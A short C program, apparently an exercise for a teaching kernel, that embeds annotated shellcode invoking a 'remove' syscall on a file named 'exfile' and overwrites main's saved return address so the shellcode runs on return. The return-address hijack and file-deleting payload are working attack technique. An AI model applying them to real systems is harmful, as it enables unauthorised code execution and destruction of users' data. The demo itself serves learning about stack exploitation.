#include <stdio.h>


char shellcode[] =
  "\x90\x90\x90\x90\x90"
  "\xe9\x0b\x00\x00\x00"        //jmp 0x15 - move eip 21 bytes
  "\x6a\x05"                    //push 0x5 - push remove syscall number
  "\xcd\x30"                    //int 0x30 - make interupt to syscall handler
  "\x31\xc0"                    //xor eax,eax - set eax to 0
  "\x50"                        //push eax
  "\x40"                        //inc eax - increment eax by 1
  "\x50"                        //push eax
  "\xcd\x30"                    //int 0x30 - make interupt to syscall handler
  "\xe8\xf0\xff\xff\xff"        //call 0xa
  "exfile";                     //file name to remove


int main(void) {
  int *ret; 			//variable stored on the stack
  ret = (int *)&ret + 2; 	//move ret two steps up in the stack so this will replace the return from main
  (*ret) = (int)shellcode; 	//overwrite ret with shellcode so it gets executed when main returns

  return 0;
}





